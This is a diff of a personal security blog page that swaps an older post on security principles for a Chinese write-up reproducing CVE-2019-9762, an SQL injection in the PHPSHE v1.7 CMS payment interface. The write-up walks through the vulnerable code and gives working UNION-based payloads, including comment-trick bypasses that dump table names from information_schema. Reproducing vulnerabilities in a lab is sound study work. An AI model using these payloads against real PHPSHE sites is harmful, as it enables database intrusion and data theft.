@@ -6,20 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>The View of Security | WebDogC</title>
+  <title>PHPSHE v1.7-SQL注入复现 | WebDogC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="安全问题的本质是信任的问题。  &amp;emsp;&amp;emsp;一切的安全方案设计的基础，都是在建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，无法设计，也无法完成。  &amp;emsp;&amp;emsp;保管文件时，确认文件安全的信任基础是锁与抽屉没有损坏、唯有自己拥有开锁的钥匙以及制造锁的工匠无法打开，一旦某个信任基础被打">
+  <meta name="description" content="0x00前言&amp;emsp;&amp;emsp;针对PHPSHE v1.7 CMS支付接口存在的SQL注入漏洞(CVE-2019-9762)进行复现。0x01环境&amp;emsp;&amp;emsp;phpStudy php5.2+mysql+apache&amp;emsp;&amp;emsp;PHPSHE v1.7 源码&amp;emsp;&amp;emsp;代码审计工具（Seay源代码审计系统）0x02过程&amp;emsp;&amp;emsp;找到漏洞存在位置ph">
 <meta property="og:type" content="article">
-<meta property="og:title" content="The View of Security">
-<meta property="og:url" content="http://yoursite.com/2020/02/29/the%20view%20of%20security/index.html">
+<meta property="og:title" content="PHPSHE v1.7-SQL注入复现">
+<meta property="og:url" content="http://yoursite.com/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="WebDogC">
-<meta property="og:description" content="安全问题的本质是信任的问题。  &amp;emsp;&amp;emsp;一切的安全方案设计的基础，都是在建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，无法设计，也无法完成。  &amp;emsp;&amp;emsp;保管文件时，确认文件安全的信任基础是锁与抽屉没有损坏、唯有自己拥有开锁的钥匙以及制造锁的工匠无法打开，一旦某个信任基础被打">
+<meta property="og:description" content="0x00前言&amp;emsp;&amp;emsp;针对PHPSHE v1.7 CMS支付接口存在的SQL注入漏洞(CVE-2019-9762)进行复现。0x01环境&amp;emsp;&amp;emsp;phpStudy php5.2+mysql+apache&amp;emsp;&amp;emsp;PHPSHE v1.7 源码&amp;emsp;&amp;emsp;代码审计工具（Seay源代码审计系统）0x02过程&amp;emsp;&amp;emsp;找到漏洞存在位置ph">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-02-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-03-01T02:51:50.259Z">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%875.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%876.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%877.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%878.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%879.png">
+<meta property="article:published_time" content="2020-04-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-04-16T12:25:53.535Z">
 <meta property="article:author" content="WebDogC">
-<meta property="article:tag" content="白帽子讲Web安全、note、security">
+<meta property="article:tag" content="复现、PHPSHE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%871.png">
   
     <link rel="alternative" href="/atom.xml" title="WebDogC" type="application/atom+xml">
   
@@ -163,60 +173,40 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-the view of security" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-PHPSHECMS v1.7SQL注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      The View of Security
+      PHPSHE v1.7-SQL注入复现
     </h1>
   
 
         
-        <a href="/2020/02/29/the%20view%20of%20security/" class="archive-article-date">
-  	<time datetime="2020-02-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-29</time>
+        <a href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2>安全问题的本质是信任的问题。</h2>
-
-<p>&emsp;&emsp;一切的安全方案设计的基础，都是在建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，无法设计，也无法完成。</p>
-<blockquote>
-<p>&emsp;&emsp;保管文件时，确认文件安全的信任基础是锁与抽屉没有损坏、唯有自己拥有开锁的钥匙以及制造锁的工匠无法打开，一旦某个信任基础被打破，那么就无法判定文件的安全。<br>&emsp;&emsp;看病时，确认身体健康安全的信任基础是医生的判断、检查仪器的结果以及自身的感觉，若某一信任基础被打破，同样无法判定身体的安全。<br>&emsp;&emsp;但是，在现实生活中，<strong>没有绝对的安全</strong>，人们会近似认为小概率事件为不可能事件，然后坚定信任基础，从而确保安全。</p>
-</blockquote>
-<p>&emsp;&emsp;所以，安全方案设计的<strong>难点</strong>在于把握信任条件的度。信任条件被打破的概率，决定了对其的信任程度，从而直接影响了安全的确保程度。</p>
-<h2>在安全的领域中，没有银弹。</h2>
-
-<p>&emsp;&emsp;针对攻防技术双方，也许会出现在某一时期其中一方占上风的情况，但是这绝对只是暂时的。无论是攻击或者防御技术都不可能永远有效，因为防御技术在发展的同时，攻击技术也在不断发展，二者是相互促进的辩证关系。</p>
-<p>&emsp;&emsp;<strong>安全是一个持续的过程</strong>。</p>
-<blockquote>
-<p>银弹：银色子弹，指由纯银质或镀银的子弹。在欧洲民间传说及19世纪以来哥特小说风潮的影响下，银色子弹往往被描绘成具有驱魔功效的武器，是针对狼人等超自然怪物的特效武器。后来也被比喻为具有极端有效性的解决方法，作为杀手锏、最强杀招、王牌等的代称。</p>
-</blockquote>
-<h2>安全三要素</h2>
-
-<p>安全三要素是安全的基本组成元素，分别是</p>
-<ul>
-<li>机密性(Confidentiality)</li>
-<li>完整性(Integrity)</li>
-<li>可用性(Availability)</li>
-</ul>
-<blockquote>
-<p>机密性要求保护数据内容不能泄露。</p>
-</blockquote>
-<blockquote>
-<p>完整性则要求保护数据内容是完整、没有被篡改的。</p>
-</blockquote>
-<blockquote>
-<p>可用性要求保护资源是“随需随得”。</p>
-</blockquote>
-<p><br><br></p>
-<p><font face="Georgia" color=#c4444>互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了。</font><br><br></p>
-<p>作者：WebDogC<br>参考书籍《白帽子讲Web安全》</p>
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;针对PHPSHE v1.7 CMS支付接口存在的SQL注入漏洞(CVE-2019-9762)进行复现。<br><strong>0x01环境</strong><br>&emsp;&emsp;phpStudy php5.2+mysql+apache<br>&emsp;&emsp;PHPSHE v1.7 源码<br>&emsp;&emsp;代码审计工具（Seay源代码审计系统）<br><strong>0x02过程</strong><br>&emsp;&emsp;找到漏洞存在位置phpshe1.7/include/plugin/payment/alipay/pay.php。<br>pay.php包含了公共文件common.php。先对comom.php进行分析。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;出现了3个函数<code>extract</code>、<code>pe_trim</code>以及<code>pe_stripslashes</code>分别进行函数查询和追踪。<br>&emsp;&emsp;<code>extract(array,extract_rules,prefix)</code>：从数组中将变量导入到当前的符号表。第二个参数为指定变量存在冲突时的规则，第三个参数为指定变量名前缀。<br>&emsp;&emsp;<code>pe_trim</code>：自定义函数，移除字符串左右空格。<br>&emsp;&emsp;<code>pe_stripslashes</code>：自定义函数，移除反斜杠。<br>这段代码是是为注册的GPC以及SESSION变量加上指定前缀。<br>在<code>pay.php</code>中，注入相关代码为<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%872.png" alt=""><br>有3个自定义函数<code>pe_dbhold</code>、<code>pe_select</code>、<code>order_table</code><br>分别进行分析<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;<code>pe_dbhold()</code>会对字符串或者数组调用<code>addslashes()</code>转义，<code>addslashes()</code>函数返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。<br>&emsp;&emsp;参数经过<code>pe_dbhold</code>函数处理后赋值给变量<code>$order_id</code>，变量<code>$order_id</code>会首先被<code>order_table</code>函数处理，再带入到<code>pe_slelect</code>函数中。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;而<code>order_table()</code>函数的作用是如果传入参数包含下划线，则返回<code>order_</code>和参数下划线之前的部分拼接字符串，如果不包含下划线则直接返回<code>order</code>。<br>&emsp;&emsp;<code>stripos(string，find)</code>函数查找字符串find在另一字符串string中第一次出现的位置（不区分大小写）。<br>&emsp;&emsp;<code>explode(separator,string)</code>函数把字符串string以字符串separator分割为数组。<br>得出结论：这里函数的返回值可控。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;再跟进到<code>pe_select</code>函数，<code>order_table()</code>函数的返回值<code>$table</code>是作为表名拼接到SQL语句，<code>$where</code>以参数值<code>array(&#39;order_id&#39;=&gt;$order_id)</code>传入函数，会<code>dowhere</code>方法处理。<br>跟进<code>_dowhere</code>方法<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;其作用是返回一条<code>where `order_id` = &#39;参数数组的值&#39;</code>的查询条件语句。<br><code>str_ireplace(find,replace,string)</code>函数替换字符串string中的一些字符find（不区分大小写）为字符串replace。<br><strong>过程整理：</strong><br>&emsp;&emsp;当我们正常操作时，在充值界面输入任意金额提交，用Burpsuite抓包，放掉第一个包，在第二个数据包中会生成一个如<code>id=pay_200409155427079</code>这样的参数值，传入代码，参数值经<code>pe_dbhold</code>处理后赋值给<code>$order_id</code>，即<code>$order_id=pay_200409155427079</code>，<code>$order_id</code>经过<code>order_table()</code>函数处理返回取出下划线前面的字符串与<code>order_</code>拼接成<code>order_pay</code>作为表名传入到<code>pe_select</code>函数，同时<code>array(&#39;order_id&#39;=&gt;$order_id)</code>即<code>array(&#39;order_id&#39;=&gt;&#39;pay_200409155427079&#39;)</code>作为<code>$where</code>参数传入到<code>pe_select</code>函数，而在<code>pe_select</code>函数中，<code>_dowhere</code>方法对<code>$where</code>进行了处理，返回一个查询条件语句<code>where `order_id`=&#39;pay_200409155427079&#39;</code>并赋值给<code>$sqlwhere</code>，结合代码，最后<code>pe_selec函数</code>返回一条查询语句<br><code>select * from `pe_order_pay` where `order_id` = &#39;pay_200409155427079&#39;</code><br>并将查询结果赋值为<code>$order</code>。<br>&emsp;&emsp;在整个过程当中，有两个关键点，一个是下划线，另外一个是参数值会作为表名传入到查询语句中。<br>利用这两点，可以构造(由数据库知表<code>pe_order_pay</code>有12个字段)<br>&emsp;&emsp;<code>payload{pay`where%201=2%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_}</code><br>最终的查询语句为<br>&emsp;&emsp;<code>select * from `pe_order_pay`where 1=2 union select 
+1,2,3,4,5,6,7,8,9,10,11,12#` where `order_id` = &#39;pay`where 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12#_&#39; limit 1</code><br><code>%23(#注释符)</code>后面的内容都被注释掉<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%877.png" alt=""><br>确认回显点在3，接着把payload中的3改成<code>database()</code>，即可查出数据库库名。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%878.png" alt=""><br><strong>成功复现SQL注入漏洞。</strong></p>
+<p>—————————-分割线—————————-</p>
+<p><strong>延伸：</strong><br>&emsp;&emsp;在数据库中发现，所有的表名及字段名都存在下划线，如果要查询表名或者字段名，必然在回显点3这个位置处出现下划线，一旦出现下划线，上文的payload逻辑就会失效，需要重新构造payload。<br>这里，提供两种思路。<br><strong>思路一：</strong><br>&emsp;&emsp;仅可以查出没有下划线的表名、字段名。通过MySQL的exists函数。上述payload当where后的条件为flase时，就可以查询出库名。<br>&emsp;&emsp;那么可以构造<br>&emsp;&emsp;<code>payload{pay`where%20not%20exits(select*from%20表名)
+%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_}</code><br>&emsp;&emsp;如果响应内容出现数据库名，说明此表存在。可以使用Burpsuite爆破模块。<br>&emsp;&emsp;查出表名后，只需将上述payload中的<code>*</code>改成字段名，同理爆破即可。<br><strong>思路二：</strong><br>&emsp;&emsp;不限下划线的数据，第一个下划线前的内容会作为表名，而参数值会被单引号闭合在SQL语句的<code>order_id</code>中，那么是否能够构造注释来个前后呼应实现绕过，可以想到MySQL的闭合注释符<code>/**/</code>，结合下划线的限制，那么在第一个下划线前后加上注释符号<code>/**/</code>即在payload中添加<code>/*_*/</code>，由于回显位会出现下划线，所以<code>/*_*/</code>必须加在回显位之前。<br>&emsp;&emsp;即构造<br>&emsp;&emsp;<code>payload
+{pay`where%201=2%20union%20select%201,2,/*_*/group_concat(table_name),4,5,6,7,8,9,10,11,12%20from%20information_schema.tables%20where%20table_schema=database()%23}</code><br>&emsp;&emsp;此payload在数据库查询的语句为<br>&emsp;&emsp;<code>select * from `pe_order_pay`where 1=2 union select 1,2,/*` where `order_id` = &#39;pay`where 1=2 union select 1,2,/*_*/group_concat(table_name),4,5,6,7,8,9,10,11,12 from information_schema.tables where table_schema=database()#&#39; limit 1</code><br>&emsp;&emsp;通过注释符，成功绕过代码的限制<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CMS/PHPSHE/%E5%9B%BE%E7%89%879.png" alt=""><br><strong>0x03总结</strong><br>&emsp;&emsp;此SQL注入漏洞主要是由于SQL查询语句中的表名为用户可控加上没有在相关函数中对其传参进行限制导致。<br>复现过程由于已知漏洞位置，复现难度不高。通过代码审计的方式了解漏洞的相关代码，构造payload注入查出库名并不难。<br>收获：</p>
+<ol>
+<li>SQL注入存在于接口中。</li>
+<li>有针对性的代码审计是一个不断溯源的过程。</li>
+<li>通过添加输出函数输出变量的方式可以更好的对代码进行分析。</li>
+<li>熟悉了一些函数。(如<code>addslashes</code>、<code>stripos</code>、<code>explode</code>、<code>str_ireplace</code>、<code>implode</code>、<code>trim</code>)</li>
+</ol>
+<p><br><br><br><br><font face="Georgia" color=#c4444>复现而知新。</font></p>
+<p>作者：WebDogC</p>
 
       
 
@@ -251,7 +241,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">白帽子讲Web安全、note、security</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">复现、PHPSHE</a>
         		</li>
       		
 		</ul>
@@ -307,7 +297,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/29/the%20view%20of%20security/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -321,18 +311,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/03/05/XSS/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          跨站脚本攻击(XSS)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/02/29/%E5%AE%89%E5%85%A8%E6%96%B9%E6%A1%88%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">安全方案设计原则</div>
+    <a href="/2020/04/16/%E7%BB%95WAF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">绕WAF</div>
       <i class="icon-circle-right"></i>
     </a>
   
